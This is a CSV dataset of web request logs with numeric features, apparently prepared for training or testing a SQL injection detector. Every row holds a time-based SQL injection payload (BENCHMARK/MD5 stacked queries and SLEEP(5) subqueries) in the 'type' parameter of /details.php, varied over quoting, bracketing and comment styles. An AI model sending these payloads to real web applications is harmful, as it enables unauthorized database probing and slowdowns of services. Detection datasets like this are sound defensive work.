full_url,parsed_url,event_time,hostname,sql_keyword,params_length,request_volume,special_chars,value_to_length
/details.php?prod=5&type=2%29%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%28%28%284716%3D4716,"/details.php?prod=5&type=2)));SELECT BENCHMARK(5000000,MD5(0x43774648)) AND (((4716=4716",1680093133.863851,10.0.2.31,2,64,220.4,1,4.6875
/details.php?prod=5&type=2%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29,"/details.php?prod=5&type=2;SELECT BENCHMARK(5000000,MD5(0x43774648))",1680093133.86813,10.0.2.31,1,44,220.4,1,4.545454545454546
/details.php?prod=5&type=2%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29--%20MAvT,"/details.php?prod=5&type=2;SELECT BENCHMARK(5000000,MD5(0x43774648))-- MAvT",1680093133.871966,10.0.2.31,1,51,220.4,2,5.882352941176471
/details.php?prod=5&type=2%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%23%20axNu,"/details.php?prod=5&type=2;SELECT BENCHMARK(5000000,MD5(0x43774648))# axNu",1680093133.875995,10.0.2.31,1,50,220.4,2,6.0
/details.php?prod=5&type=2%29%29%20AS%20PSPH%20WHERE%206625%3D6625%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29--%20EkgW,"/details.php?prod=5&type=2)) AS PSPH WHERE 6625=6625;SELECT BENCHMARK(5000000,MD5(0x43774648))-- EkgW",1680093133.879837,10.0.2.31,3,77,220.4,2,6.4935064935064934
/details.php?prod=5&type=2%29%20AS%20UhYb%20WHERE%204144%3D4144%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29--%20vvMm,"/details.php?prod=5&type=2) AS UhYb WHERE 4144=4144;SELECT BENCHMARK(5000000,MD5(0x43774648))-- vvMm",1680093133.885791,10.0.2.31,3,76,220.4,2,6.578947368421052
/details.php?prod=5&type=2%60%20WHERE%206750%3D6750%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29--%20gsxU,"/details.php?prod=5&type=2` WHERE 6750=6750;SELECT BENCHMARK(5000000,MD5(0x43774648))-- gsxU",1680093133.889705,10.0.2.31,2,68,220.4,2,5.882352941176471
/details.php?prod=5&type=2%60%29%20WHERE%206384%3D6384%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29--%20tSJx,"/details.php?prod=5&type=2`) WHERE 6384=6384;SELECT BENCHMARK(5000000,MD5(0x43774648))-- tSJx",1680093133.900058,10.0.2.31,2,69,220.4,2,5.797101449275362
/details.php?prod=5&type=2%60%3D%602%60%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%602%60%3D%602,"/details.php?prod=5&type=2`=`2`;SELECT BENCHMARK(5000000,MD5(0x43774648)) AND `2`=`2",1680093133.904594,10.0.2.31,2,60,220.4,1,5.0
/details.php?prod=5&type=2%5D-%28SELECT%200%20WHERE%206592%3D6592%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%29%7C%5B2,"/details.php?prod=5&type=2]-(SELECT 0 WHERE 6592=6592;SELECT BENCHMARK(5000000,MD5(0x43774648)))|[2",1680093133.912119,10.0.2.31,2,75,220.4,1,4.0
/details.php?prod=5&type=2%27%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29--%20obuo,"/details.php?prod=5&type=2');SELECT BENCHMARK(5000000,MD5(0x43774648))-- obuo",1680093133.916678,10.0.2.31,1,53,220.4,3,7.547169811320755
/details.php?prod=5&type=2%27%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29--%20zwLV,"/details.php?prod=5&type=2';SELECT BENCHMARK(5000000,MD5(0x43774648))-- zwLV",1680093133.920776,10.0.2.31,1,52,220.4,3,7.6923076923076925
/details.php?prod=5&type=2%22%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29--%20pQfV,"/details.php?prod=5&type=2"";SELECT BENCHMARK(5000000,MD5(0x43774648))-- pQfV",1680093133.925066,10.0.2.31,1,52,220.4,3,7.6923076923076925
/details.php?prod=5&type=2%27%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%28%27HFkp%27%3D%27HFkp,"/details.php?prod=5&type=2');SELECT BENCHMARK(5000000,MD5(0x43774648)) AND ('HFkp'='HFkp",1680093133.928255,10.0.2.31,2,64,220.4,2,6.25
/details.php?prod=5&type=2%27%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%28%28%27gZIg%27%3D%27gZIg,"/details.php?prod=5&type=2'));SELECT BENCHMARK(5000000,MD5(0x43774648)) AND (('gZIg'='gZIg",1680093133.935221,10.0.2.31,2,66,220.4,2,6.0606060606060606
/details.php?prod=5&type=2%27%29%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%28%28%28%27SBBS%27%3D%27SBBS,"/details.php?prod=5&type=2')));SELECT BENCHMARK(5000000,MD5(0x43774648)) AND ((('SBBS'='SBBS",1680093133.938783,10.0.2.31,2,68,220.4,2,5.882352941176471
/details.php?prod=5&type=2%27%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%27XGcD%27%3D%27XGcD,"/details.php?prod=5&type=2';SELECT BENCHMARK(5000000,MD5(0x43774648)) AND 'XGcD'='XGcD",1680093133.942341,10.0.2.31,2,62,220.4,2,6.451612903225806
/details.php?prod=5&type=2%27%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%28%27MeBg%27%20LIKE%20%27MeBg,"/details.php?prod=5&type=2');SELECT BENCHMARK(5000000,MD5(0x43774648)) AND ('MeBg' LIKE 'MeBg",1680093133.946113,10.0.2.31,3,69,220.4,2,7.246376811594203
/details.php?prod=5&type=2%27%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%28%28%27CXrV%27%20LIKE%20%27CXrV,"/details.php?prod=5&type=2'));SELECT BENCHMARK(5000000,MD5(0x43774648)) AND (('CXrV' LIKE 'CXrV",1680093133.95041,10.0.2.31,3,71,220.4,2,7.042253521126761
/details.php?prod=5&type=2%27%29%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%28%28%28%27VLAx%27%20LIKE%20%27VLAx,"/details.php?prod=5&type=2')));SELECT BENCHMARK(5000000,MD5(0x43774648)) AND ((('VLAx' LIKE 'VLAx",1680093133.954492,10.0.2.31,3,73,220.4,2,6.8493150684931505
/details.php?prod=5&type=2%25%27%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%27vPhl%25%27%3D%27vPhl,"/details.php?prod=5&type=2%';SELECT BENCHMARK(5000000,MD5(0x43774648)) AND 'vPhl%'='vPhl",1680093133.958204,10.0.2.31,2,64,220.4,2,6.25
/details.php?prod=5&type=2%27%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%27Ytoj%27%20LIKE%20%27Ytoj,"/details.php?prod=5&type=2';SELECT BENCHMARK(5000000,MD5(0x43774648)) AND 'Ytoj' LIKE 'Ytoj",1680093133.961175,10.0.2.31,3,67,220.4,2,7.462686567164179
/details.php?prod=5&type=2%22%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%28%22vxnq%22%3D%22vxnq,"/details.php?prod=5&type=2"");SELECT BENCHMARK(5000000,MD5(0x43774648)) AND (""vxnq""=""vxnq",1680093133.965626,10.0.2.31,2,64,220.4,2,6.25
/details.php?prod=5&type=2%22%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%28%28%22exRW%22%3D%22exRW,"/details.php?prod=5&type=2""));SELECT BENCHMARK(5000000,MD5(0x43774648)) AND ((""exRW""=""exRW",1680093133.969146,10.0.2.31,2,66,220.4,2,6.0606060606060606
/details.php?prod=5&type=2%22%29%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%28%28%28%22RJuV%22%3D%22RJuV,"/details.php?prod=5&type=2"")));SELECT BENCHMARK(5000000,MD5(0x43774648)) AND (((""RJuV""=""RJuV",1680093133.973429,10.0.2.31,2,68,220.4,2,5.882352941176471
/details.php?prod=5&type=2%22%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%22tPWj%22%3D%22tPWj,"/details.php?prod=5&type=2"";SELECT BENCHMARK(5000000,MD5(0x43774648)) AND ""tPWj""=""tPWj",1680093133.976893,10.0.2.31,2,62,220.4,2,6.451612903225806
/details.php?prod=5&type=2%22%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%28%22GAvZ%22%20LIKE%20%22GAvZ,"/details.php?prod=5&type=2"");SELECT BENCHMARK(5000000,MD5(0x43774648)) AND (""GAvZ"" LIKE ""GAvZ",1680093133.980425,10.0.2.31,3,69,220.4,2,7.246376811594203
/details.php?prod=5&type=2%22%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%28%28%22FBMS%22%20LIKE%20%22FBMS,"/details.php?prod=5&type=2""));SELECT BENCHMARK(5000000,MD5(0x43774648)) AND ((""FBMS"" LIKE ""FBMS",1680093133.983907,10.0.2.31,3,71,220.4,2,7.042253521126761
/details.php?prod=5&type=2%22%29%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%28%28%28%22OYEA%22%20LIKE%20%22OYEA,"/details.php?prod=5&type=2"")));SELECT BENCHMARK(5000000,MD5(0x43774648)) AND (((""OYEA"" LIKE ""OYEA",1680093133.990784,10.0.2.31,3,73,220.4,2,6.8493150684931505
/details.php?prod=5&type=2%22%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%22LMRK%22%20LIKE%20%22LMRK,"/details.php?prod=5&type=2"";SELECT BENCHMARK(5000000,MD5(0x43774648)) AND ""LMRK"" LIKE ""LMRK",1680093133.994407,10.0.2.31,3,67,220.4,2,7.462686567164179
/details.php?prod=5&type=2%27%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20OR%20%27UTCX%27%3D%27Bjur,"/details.php?prod=5&type=2';SELECT BENCHMARK(5000000,MD5(0x43774648)) OR 'UTCX'='Bjur",1680093133.998829,10.0.2.31,2,61,220.4,2,6.557377049180328
/details.php?prod=5&type=2%27%29%29%20AS%20DdDG%20WHERE%206474%3D6474%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29--%20RkJj,"/details.php?prod=5&type=2')) AS DdDG WHERE 6474=6474;SELECT BENCHMARK(5000000,MD5(0x43774648))-- RkJj",1680093134.003009,10.0.2.31,3,78,220.4,3,7.6923076923076925
/details.php?prod=5&type=2%22%29%29%20AS%20jjQB%20WHERE%207715%3D7715%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29--%20YpBa,"/details.php?prod=5&type=2"")) AS jjQB WHERE 7715=7715;SELECT BENCHMARK(5000000,MD5(0x43774648))-- YpBa",1680093134.006118,10.0.2.31,3,78,220.4,3,7.6923076923076925
/details.php?prod=5&type=2%27%29%20AS%20hYLl%20WHERE%209151%3D9151%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29--%20zkJL,"/details.php?prod=5&type=2') AS hYLl WHERE 9151=9151;SELECT BENCHMARK(5000000,MD5(0x43774648))-- zkJL",1680093134.009935,10.0.2.31,3,77,220.4,3,7.792207792207792
/details.php?prod=5&type=2%22%29%20AS%20OrGq%20WHERE%202031%3D2031%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29--%20FztZ,"/details.php?prod=5&type=2"") AS OrGq WHERE 2031=2031;SELECT BENCHMARK(5000000,MD5(0x43774648))-- FztZ",1680093134.01339,10.0.2.31,3,77,220.4,3,7.792207792207792
/details.php?prod=5&type=2%22%3D%222%22%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%222%22%3D%222,"/details.php?prod=5&type=2""=""2"";SELECT BENCHMARK(5000000,MD5(0x43774648)) AND ""2""=""2",1680093134.016914,10.0.2.31,2,60,220.4,2,6.666666666666667
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%23,"/details.php?prod=5&type=2' IN BOOLEAN MODE);SELECT BENCHMARK(5000000,MD5(0x43774648))#",1680093134.019846,10.0.2.31,2,63,220.4,3,7.936507936507937
/details.php?prod=5&type=2%29%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29--%20kDgM,/details.php?prod=5&type=2) AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx)-- kDgM,1680093134.023402,10.0.2.31,3,56,220.4,1,7.142857142857143
/details.php?prod=5&type=2%29%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%282758%3D2758,/details.php?prod=5&type=2) AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND (2758=2758,1680093134.026601,10.0.2.31,3,64,220.4,0,4.6875
/details.php?prod=5&type=2%29%29%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%28%289698%3D9698,/details.php?prod=5&type=2)) AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND ((9698=9698,1680093134.030186,10.0.2.31,3,66,220.4,0,4.545454545454546
/details.php?prod=5&type=2%29%29%29%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%28%28%285609%3D5609,/details.php?prod=5&type=2))) AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND (((5609=5609,1680093134.035288,10.0.2.31,3,68,220.4,0,4.411764705882353
/details.php?prod=5&type=2%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29,/details.php?prod=5&type=2 AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx),1680093134.038767,10.0.2.31,3,48,220.4,0,6.25
/details.php?prod=5&type=2%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29--%20Igkv,/details.php?prod=5&type=2 AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx)-- Igkv,1680093134.042431,10.0.2.31,3,55,220.4,1,7.2727272727272725
/details.php?prod=5&type=2%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%23%20YZKv,/details.php?prod=5&type=2 AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx)# YZKv,1680093134.0463,10.0.2.31,3,54,220.4,1,7.407407407407407
/details.php?prod=5&type=2%29%20WHERE%201997%3D1997%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29--%20CcUq,/details.php?prod=5&type=2) WHERE 1997=1997 AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx)-- CcUq,1680093134.053988,10.0.2.31,4,72,220.4,1,6.944444444444445
/details.php?prod=5&type=2%20WHERE%206093%3D6093%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29--%20cBOr,/details.php?prod=5&type=2 WHERE 6093=6093 AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx)-- cBOr,1680093134.059419,10.0.2.31,4,71,220.4,1,7.042253521126761
/details.php?prod=5&type=2%2B%28SELECT%20buJc%20WHERE%205177%3D5177%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%29%2B,/details.php?prod=5&type=2+(SELECT buJc WHERE 5177=5177 AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx))+,1680093134.070191,10.0.2.31,4,79,220.4,0,5.063291139240507
/details.php?prod=5&type=2%29%29%20AS%20BiOL%20WHERE%208907%3D8907%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29--%20hGAe,/details.php?prod=5&type=2)) AS BiOL WHERE 8907=8907 AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx)-- hGAe,1680093134.083122,10.0.2.31,5,81,220.4,1,7.407407407407407
/details.php?prod=5&type=2%29%20AS%20Xwfo%20WHERE%209485%3D9485%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29--%20DFeJ,/details.php?prod=5&type=2) AS Xwfo WHERE 9485=9485 AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx)-- DFeJ,1680093134.088034,10.0.2.31,5,80,220.4,1,7.5
/details.php?prod=5&type=2%60%20WHERE%203722%3D3722%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29--%20iSSB,/details.php?prod=5&type=2` WHERE 3722=3722 AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx)-- iSSB,1680093134.091888,10.0.2.31,4,72,220.4,1,6.944444444444445
/details.php?prod=5&type=2%60%29%20WHERE%205759%3D5759%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29--%20MYgU,/details.php?prod=5&type=2`) WHERE 5759=5759 AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx)-- MYgU,1680093134.096152,10.0.2.31,4,73,220.4,1,6.8493150684931505
/details.php?prod=5&type=2%60%3D%602%60%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%602%60%3D%602,/details.php?prod=5&type=2`=`2` AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND `2`=`2,1680093134.101046,10.0.2.31,3,64,220.4,0,4.6875
/details.php?prod=5&type=2%5D-%28SELECT%200%20WHERE%204299%3D4299%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%29%7C%5B2,/details.php?prod=5&type=2]-(SELECT 0 WHERE 4299=4299 AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx))|[2,1680093134.104799,10.0.2.31,4,79,220.4,0,5.063291139240507
/details.php?prod=5&type=2%27%29%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29--%20NGGR,/details.php?prod=5&type=2') AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx)-- NGGR,1680093134.108249,10.0.2.31,3,57,220.4,2,8.771929824561404
/details.php?prod=5&type=2%27%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29--%20WRjr,/details.php?prod=5&type=2' AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx)-- WRjr,1680093134.111565,10.0.2.31,3,56,220.4,2,8.928571428571429
/details.php?prod=5&type=2%22%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29--%20ifXc,"/details.php?prod=5&type=2"" AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx)-- ifXc",1680093134.115691,10.0.2.31,3,56,220.4,2,8.928571428571429
/details.php?prod=5&type=2%27%29%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%28%27nuMi%27%3D%27nuMi,/details.php?prod=5&type=2') AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND ('nuMi'='nuMi,1680093134.119326,10.0.2.31,3,68,220.4,1,5.882352941176471
/details.php?prod=5&type=2%27%29%29%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%28%28%27SNAr%27%3D%27SNAr,/details.php?prod=5&type=2')) AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND (('SNAr'='SNAr,1680093134.122694,10.0.2.31,3,70,220.4,1,5.714285714285714
/details.php?prod=5&type=2%27%29%29%29%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%28%28%28%27OuPB%27%3D%27OuPB,/details.php?prod=5&type=2'))) AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND ((('OuPB'='OuPB,1680093134.1263,10.0.2.31,3,72,220.4,1,5.555555555555555
/details.php?prod=5&type=2%27%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%27JHmR%27%3D%27JHmR,/details.php?prod=5&type=2' AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND 'JHmR'='JHmR,1680093134.129264,10.0.2.31,3,66,220.4,1,6.0606060606060606
/details.php?prod=5&type=2%27%29%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%28%27BqiG%27%20LIKE%20%27BqiG,/details.php?prod=5&type=2') AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND ('BqiG' LIKE 'BqiG,1680093134.132964,10.0.2.31,4,73,220.4,1,6.8493150684931505
/details.php?prod=5&type=2%27%29%29%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%28%28%27eNxq%27%20LIKE%20%27eNxq,/details.php?prod=5&type=2')) AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND (('eNxq' LIKE 'eNxq,1680093134.136783,10.0.2.31,4,75,220.4,1,6.666666666666667
/details.php?prod=5&type=2%27%29%29%29%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%28%28%28%27aUlk%27%20LIKE%20%27aUlk,/details.php?prod=5&type=2'))) AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND ((('aUlk' LIKE 'aUlk,1680093134.139871,10.0.2.31,4,77,220.4,1,6.4935064935064934
/details.php?prod=5&type=2%25%27%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%27cebJ%25%27%3D%27cebJ,/details.php?prod=5&type=2%' AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND 'cebJ%'='cebJ,1680093134.143551,10.0.2.31,3,68,220.4,1,5.882352941176471
/details.php?prod=5&type=2%27%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%27nDDa%27%20LIKE%20%27nDDa,/details.php?prod=5&type=2' AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND 'nDDa' LIKE 'nDDa,1680093134.147149,10.0.2.31,4,71,220.4,1,7.042253521126761
/details.php?prod=5&type=2%22%29%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%28%22GrMc%22%3D%22GrMc,"/details.php?prod=5&type=2"") AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND (""GrMc""=""GrMc",1680093134.150331,10.0.2.31,3,68,220.4,1,5.882352941176471
/details.php?prod=5&type=2%22%29%29%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%28%28%22ilNl%22%3D%22ilNl,"/details.php?prod=5&type=2"")) AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND ((""ilNl""=""ilNl",1680093134.154099,10.0.2.31,3,70,220.4,1,5.714285714285714
/details.php?prod=5&type=2%22%29%29%29%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%28%28%28%22Xhjz%22%3D%22Xhjz,"/details.php?prod=5&type=2""))) AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND (((""Xhjz""=""Xhjz",1680093134.157452,10.0.2.31,3,72,220.4,1,5.555555555555555
/details.php?prod=5&type=2%22%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%22HEpQ%22%3D%22HEpQ,"/details.php?prod=5&type=2"" AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND ""HEpQ""=""HEpQ",1680093134.160468,10.0.2.31,3,66,220.4,1,6.0606060606060606
/details.php?prod=5&type=2%22%29%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%28%22zczR%22%20LIKE%20%22zczR,"/details.php?prod=5&type=2"") AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND (""zczR"" LIKE ""zczR",1680093134.163877,10.0.2.31,4,73,220.4,1,6.8493150684931505
/details.php?prod=5&type=2%22%29%29%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%28%28%22TIaw%22%20LIKE%20%22TIaw,"/details.php?prod=5&type=2"")) AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND ((""TIaw"" LIKE ""TIaw",1680093134.167767,10.0.2.31,4,75,220.4,1,6.666666666666667
/details.php?prod=5&type=2%22%29%29%29%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%28%28%28%22czgp%22%20LIKE%20%22czgp,"/details.php?prod=5&type=2""))) AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND (((""czgp"" LIKE ""czgp",1680093134.171102,10.0.2.31,4,77,220.4,1,6.4935064935064934
/details.php?prod=5&type=2%22%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20AND%20%22HjnZ%22%20LIKE%20%22HjnZ,"/details.php?prod=5&type=2"" AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) AND ""HjnZ"" LIKE ""HjnZ",1680093134.174585,10.0.2.31,4,71,220.4,1,7.042253521126761
/details.php?prod=5&type=2%27%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29%20OR%20%27cSfE%27%3D%27NZim,/details.php?prod=5&type=2' AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx) OR 'cSfE'='NZim,1680093134.178159,10.0.2.31,4,65,220.4,1,7.6923076923076925
/details.php?prod=5&type=2%27%29%20WHERE%201610%3D1610%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29--%20nTKM,/details.php?prod=5&type=2') WHERE 1610=1610 AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx)-- nTKM,1680093134.181523,10.0.2.31,4,73,220.4,2,8.219178082191782
/details.php?prod=5&type=2%22%29%20WHERE%208298%3D8298%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29--%20cVTF,"/details.php?prod=5&type=2"") WHERE 8298=8298 AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx)-- cVTF",1680093134.185299,10.0.2.31,4,73,220.4,2,8.219178082191782
/details.php?prod=5&type=2%27%20WHERE%203157%3D3157%20AND%20%28SELECT%201218%20FROM%20%28SELECT%28SLEEP%285%29%29%29IuLx%29--%20SxYR,/details.php?prod=5&type=2' WHERE 3157=3157 AND (SELECT 1218 FROM (SELECT(SLEEP(5)))IuLx)-- SxYR,1680093134.188728,10.0.2.31,4,72,220.4,2,8.333333333333334
